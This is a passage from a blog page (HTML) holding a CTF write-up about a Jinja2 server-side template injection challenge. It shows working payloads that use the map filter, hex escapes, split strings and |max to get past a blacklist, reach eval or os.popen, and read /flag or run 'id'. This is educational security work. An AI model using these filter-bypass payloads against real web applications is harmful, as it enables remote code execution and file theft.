@@ -1,0 +1,404 @@
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22></text></svg>"><meta name="generator" content="Astro v5.13.9"><!-- Canonical URL --><link rel="canonical" href="https://j3seer.github.io/blog/02-sparkctf-2022---writeup/"><!-- Primary Meta Tags --><title>Teach me - SparkCTF Writeup | j3seer</title><meta name="title" content="Teach me - SparkCTF Writeup | j3seer"><meta name="description" content="Writeup for a challenge i wrote for SparkCTF 2022 held locally in Tunisia"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://j3seer.github.io/blog/02-sparkctf-2022---writeup/"><meta property="og:title" content="Teach me - SparkCTF Writeup | j3seer"><meta property="og:description" content="Writeup for a challenge i wrote for SparkCTF 2022 held locally in Tunisia"><meta property="og:image" content="https://j3seer.github.io/astro-micro.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://j3seer.github.io/blog/02-sparkctf-2022---writeup/"><meta property="twitter:title" content="Teach me - SparkCTF Writeup | j3seer"><meta property="twitter:description" content="Writeup for a challenge i wrote for SparkCTF 2022 held locally in Tunisia"><meta property="twitter:image" content="https://j3seer.github.io/astro-micro.jpg"><!-- PageFind --><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.B3vRBseb.js"></script><script>
+  function init() {
+    preloadTheme();
+    onScroll();
+    animate();
+    updateThemeButtons();
+    addCopyCodeButtons();
+    setGiscusTheme();
+
+    const backToTop = document.getElementById("back-to-top");
+    backToTop?.addEventListener("click", (event) => scrollToTop(event));
+
+    const backToPrev = document.getElementById("back-to-prev");
+    backToPrev?.addEventListener("click", () => window.history.back());
+
+    const lightThemeButton = document.getElementById("light-theme-button");
+    lightThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "light");
+      toggleTheme(false);
+      updateThemeButtons();
+    });
+
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    darkThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "dark");
+      toggleTheme(true);
+      updateThemeButtons();
+    });
+
+    const systemThemeButton = document.getElementById("system-theme-button");
+    systemThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "system");
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+      updateThemeButtons();
+    });
+
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (event) => {
+        if (localStorage.theme === "system") {
+          toggleTheme(event.matches);
+        }
+      });
+
+    document.addEventListener("scroll", onScroll);
+  }
+
+  function updateThemeButtons() {
+    const theme = localStorage.getItem("theme");
+    const lightThemeButton = document.getElementById("light-theme-button");
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    const systemThemeButton = document.getElementById("system-theme-button");
+
+    function removeActiveButtonTheme(button) {
+      button?.classList.remove("bg-black/5");
+      button?.classList.remove("dark:bg-white/5");
+    }
+
+    function addActiveButtonTheme(button) {
+      button?.classList.add("bg-black/5");
+      button?.classList.add("dark:bg-white/5");
+    }
+
+    removeActiveButtonTheme(lightThemeButton);
+    removeActiveButtonTheme(darkThemeButton);
+    removeActiveButtonTheme(systemThemeButton);
+
+    if (theme === "light") {
+      addActiveButtonTheme(lightThemeButton);
+    } else if (theme === "dark") {
+      addActiveButtonTheme(darkThemeButton);
+    } else {
+      addActiveButtonTheme(systemThemeButton);
+    }
+  }
+
+  function animate() {
+    const animateElements = document.querySelectorAll(".animate");
+
+    animateElements.forEach((element, index) => {
+      setTimeout(() => {
+        element.classList.add("show");
+      }, index * 100);
+    });
+  }
+
+  function onScroll() {
+    if (window.scrollY > 0) {
+      document.documentElement.classList.add("scrolled");
+    } else {
+      document.documentElement.classList.remove("scrolled");
+    }
+  }
+
+  function scrollToTop(event) {
+    event.preventDefault();
+    window.scrollTo({
+      top: 0,
+      behavior: "smooth",
+    });
+  }
+
+  function toggleTheme(dark) {
+    const css = document.createElement("style");
+
+    css.appendChild(
+      document.createTextNode(
+        `* {
+             -webkit-transition: none !important;
+             -moz-transition: none !important;
+             -o-transition: none !important;
+             -ms-transition: none !important;
+             transition: none !important;
+          }
+        `,
+      ),
+    );
+
+    document.head.appendChild(css);
+
+    if (dark) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+
+    window.getComputedStyle(css).opacity;
+    document.head.removeChild(css);
+
+    setGiscusTheme();
+  }
+
+  function preloadTheme() {
+    const userTheme = localStorage.theme;
+
+    if (userTheme === "light" || userTheme === "dark") {
+      toggleTheme(userTheme === "dark");
+    } else {
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+    }
+  }
+
+  function addCopyCodeButtons() {
+    let copyButtonLabel = "📋";
+    let codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    async function copyCode(codeBlock, copyButton) {
+      const codeText = codeBlock.innerText;
+      const buttonText = copyButton.innerText;
+      const textToCopy = codeText.replace(buttonText, "");
+
+      await navigator.clipboard.writeText(textToCopy);
+      copyButton.innerText = "✅";
+
+      setTimeout(() => {
+        copyButton.innerText = copyButtonLabel;
+      }, 2000);
+    }
+
+    for (let codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      const copyButton = document.createElement("button");
+      copyButton.innerText = copyButtonLabel;
+      copyButton.classList = "copy-code";
+
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      codeBlock.parentNode.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton?.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+  }
+
+  const setGiscusTheme = () => {
+    const giscus = document.querySelector(".giscus-frame");
+
+    const isDark = document.documentElement.classList.contains("dark");
+
+    if (giscus) {
+      const url = new URL(giscus.src);
+      url.searchParams.set("theme", isDark ? "dark" : "light");
+      giscus.src = url.toString();
+    }
+  };
+
+  document.addEventListener("DOMContentLoaded", () => init());
+  document.addEventListener("astro:after-swap", () => init());
+  preloadTheme();
+</script><link rel="stylesheet" href="/_astro/about.BEDs3EvQ.css"></head> <body> <noscript> <style>
+        .animate{
+          opacity:1;
+          translate: var(--tw-translate-x) calc(var(--spacing) * 0);
+        }
+      </style> </noscript> <header data-astro-transition-persist="astro-l7r54iwe-1"> <div class="mx-auto max-w-300 px-5"> <div class="flex flex-wrap justify-between gap-y-2"> <a href="/" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out">  <div class="flex items-center gap-2 font-semibold"> <img src="/logo.png" alt="Logo" class="size-6 object-contain"> <span>j3seer</span> </div>  </a> <nav class="flex items-center gap-4 text-sm"> <a href="/blog" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]">  <span>
+Blog
+</span>  </a>  ~  <a href="/cves" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]">  <span>
+CVEs
+</span>  </a>  ~  <a href="/about" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]">  <span>
+About
+</span>  </a> <button id="magnifying-glass" aria-label="Search" class="flex items-center rounded-sm border border-black/15 bg-neutral-100 px-2 py-1 text-xs transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:bg-neutral-900 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M3.5 7C3.5 5.067 5.067 3.5 7 3.5C8.933 3.5 10.5 5.067 10.5 7C10.5 7.88461 10.1718 8.69256 9.63058 9.30876L9.30876 9.63058C8.69256 10.1718 7.88461 10.5 7 10.5C5.067 10.5 3.5 8.933 3.5 7ZM9.96544 11.0261C9.13578 11.6382 8.11014 12 7 12C4.23858 12 2 9.76142 2 7C2 4.23858 4.23858 2 7 2C9.76142 2 12 4.23858 12 7C12 8.11014 11.6382 9.13578 11.0261 9.96544L14.0303 12.9697L14.5607 13.5L13.5 14.5607L12.9697 14.0303L9.96544 11.0261Z" fill="currentColor"></path></svg>
+&nbsp;Search
+</button> </nav> </div> </div> </header> <main>  <div class="mx-auto max-w-300 px-5"> <div class="animate"> <a href="/blog" class="not-prose group relative flex w-fit flex-nowrap rounded-sm border border-black/15 py-1.5 pl-7 pr-3 transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm"> Back to blog </div> </a> </div> <div class="my-10 space-y-1"> <div class="animate flex items-center gap-1.5"> <div class="font-base text-sm"> <time datetime="2022-12-05T00:00:00.000Z"> December 05, 2022 </time> </div>
+&bull;
+<div class="font-base text-sm"> 5 min read </div> </div> <h1 class="animate text-3xl font-semibold text-black dark:text-white"> Teach me - SparkCTF Writeup </h1>  </div> <details open class="animate group rounded-lg border border-black/15 my-5 dark:border-white/20"> <summary class="cursor-pointer rounded-t-lg px-3 py-1.5 font-medium transition-colors group-open:bg-black/5 hover:bg-black/5 dark:group-open:bg-white/5 hover:dark:bg-white/5">Table of Contents</summary> <nav> <ul class="py-3"> <li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#description" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Description </a> <ul class="translate-x-3"> <li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#brief-solution" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Brief solution </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#explanation-on-how-to-approach" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Explanation on How to approach : </a> <ul class="translate-x-3"> <li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#why-lipsum" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Why (lipsum,) ?? </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#why-even-bother-to-think-of-this" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Why even bother to think of this? </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#why-map" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Why map? </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#wtf-is-max" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> WTF is |max ? </a>  </li> </ul> </li> </ul> </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#solutions" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Solutions </a> <ul class="translate-x-3"> <li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#lipsum-solution" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> lipsum solution : </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#cycler-solution" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> cycler solution : </a>  </li><li class="list-inside list-disc px-6 py-1.5 text-sm"> <a href="#blind-solution" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]"> Blind solution: </a>  </li> </ul> </li> </ul> </nav> </details><article class="animate"> <h1 id="description">Description</h1>
+<p>This challenge was about acheiving SSTI rce with an abstract way of getting the attributes and builtins. The idea was inspired from the GDG Algiers CTF 2022.</p>
+<p>I really loved the idea of using some abstract filter that can <i> “almost” </i> trully bypass any blacklist ( still need more research ) but the main thing is that we can now trully call any attribute using this trick and its rare that a blacklist would prevent you from using the <code>map</code> filter.</p>
+<p>I just wanted it to be a bit harder so i added few more restrictions in my challenge, the same idea persists, but different method and with an extra step</p>
+<p><a href="https://github.com/GDGAlgiers/gdg-algiers-ctf-2022-writeups/tree/main/web/pipe-your-way">https://github.com/GDGAlgiers/gdg-algiers-ctf-2022-writeups/tree/main/web/pipe-your-way</a></p>
+<p>Shoutout to the authors of <code>pipe your way</code> in GDG i really enjoyed that challenge</p>
+<h2 id="brief-solution">Brief solution</h2>
+<p>My solver using eval payload with lipsum:</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{{</span><span style="color:var(--astro-code-foreground)"> lipsum</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-constant)">__globals__</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-constant)">__builtins__</span><span style="color:var(--astro-code-foreground)">[</span><span style="color:var(--astro-code-token-string-expression)">'eval'</span><span style="color:var(--astro-code-foreground)">]</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">'open("/flag").read()'</span><span style="color:var(--astro-code-token-punctuation)">)}}</span></span>
+<span class="line"></span></code></pre>
+<p>Turned into :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> exploit = ((lipsum</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fglo""bals\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"\x5F\x5Fbui""ltins\x5F\x5F"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"at""tribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"ev""al"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">max</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"o""pen('/fl''ag')\x2Er""ead()"</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-keyword)"> %</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(exploit)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre>
+<p>TLDR;</p>
+<ol>
+<li>
+<p>using map() filter to get attributes</p>
+</li>
+<li>
+<p>using {% %} to set and print the output since {{}} are blacklisted</p>
+</li>
+<li>
+<p>using |max to get the specific attribute in eval</p>
+</li>
+<li>
+<p>using hex encoding since _ is blacklisted.</p>
+</li>
+<li>
+<p>using quotes trick to bypass filtered words</p>
+</li>
+</ol>
+<h2 id="explanation-on-how-to-approach">Explanation on How to approach :</h2>
+<h3 id="why-lipsum">Why (lipsum,) ??</h3>
+<p>In jinja or in python u can call multiple functions using () like this : (lipsum,config,cycler,)</p>
+<p>Be aware if u don’t add <code>,</code> in the end it doesnt work.</p>
+<h3 id="why-even-bother-to-think-of-this">Why even bother to think of this?</h3>
+<p>map only works on a an iterated object and since we defined a “tuple” with a lipsum we can choose to map just lipsum</p>
+<h3 id="why-map">Why map?</h3>
+<p>map is a filter used to access an attribute of an object.</p>
+<p>Example :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{{</span><span style="color:var(--astro-code-foreground)"> users</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(attribute</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">'username'</span><span style="color:var(--astro-code-token-punctuation)">)</span><span style="color:var(--astro-code-token-punctuation)"> }}</span></span>
+<span class="line"></span></code></pre>
+<p>And since we can’t apply an attribute directly (like this : <code>map(attribute='test')</code> ) because attr is filtered so using <code>**kwargs</code> we can specify we’re mapping an attribute</p>
+<p>now since all our payload attributes are gonna be inside quotes we can easily bypass the filter with just adding "" in the middle to split the string and using hex for the rest ( note u can use hex for all not just the _ )</p>
+<p>thats still not enough…When using map some issues can happen</p>
+<h3 id="wtf-is-max">WTF is <code>|max</code> ?</h3>
+<p>Great question , so if you noticed i explicitly filtered out <code>list</code> and <code>last</code> , practically these do the same thing. let’s investigate why <code>max</code> does the same thing as <code>list|last</code> in <b> our case </b> !!</p>
+<p>let’s try and work with this payload :</p>
+<p><code>lipsum.__globals__.__os__.__popen__('id').read()</code></p>
+<p>now let’s trying using the map technique without max or list or last, stop at popen and see what happens.</p>
+<p>Payload :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> x=((lipsum</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"__globals__"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"os"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)"> : </span><span style="color:var(--astro-code-token-string-expression)">"popen"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-foreground)">) </span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span><span style="color:var(--astro-code-token-punctuation)"> {</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(x)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre>
+<p>Output :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-foreground)">generator </span><span style="color:var(--astro-code-token-constant)">object</span><span style="color:var(--astro-code-foreground)"> sync_do_map at 0xfunction_number_here</span><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-foreground)"> </span></span>
+<span class="line"></span></code></pre>
+<p>The issue with map is that while we are trully mapping the attribute, we’re not really calling popen, we’re calling the map filter thats why you see “sync_do_map”</p>
+<p>So how do we fix this?</p>
+<p>A better way to understand this is to stop at globals, globals has bunch of attributes right? while os and popen is just one.</p>
+<p>Let’s try this :</p>
+<p>Payload :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> x=((lipsum</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-string-expression)">"__globals__"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(x)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre>
+<p>output :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-foreground)">generator </span><span style="color:var(--astro-code-token-constant)">object</span><span style="color:var(--astro-code-foreground)"> sync_do_map at 0xfunction_number</span><span style="color:var(--astro-code-token-keyword)">></span></span>
+<span class="line"></span></code></pre>
+<p>Payload :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-constant)"> set</span><span style="color:var(--astro-code-foreground)"> x=((lipsum</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-function)">map</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-punctuation)">{</span><span style="color:var(--astro-code-token-string-expression)">"attribute"</span><span style="color:var(--astro-code-token-punctuation)">:</span><span style="color:var(--astro-code-token-string-expression)">"__globals__"</span><span style="color:var(--astro-code-token-punctuation)">})</span><span style="color:var(--astro-code-token-keyword)">|</span><span style="color:var(--astro-code-token-constant)">list</span><span style="color:var(--astro-code-foreground)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}{</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(x)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-token-punctuation)">}</span></span>
+<span class="line"></span></code></pre>
+<p>output :</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"></span>
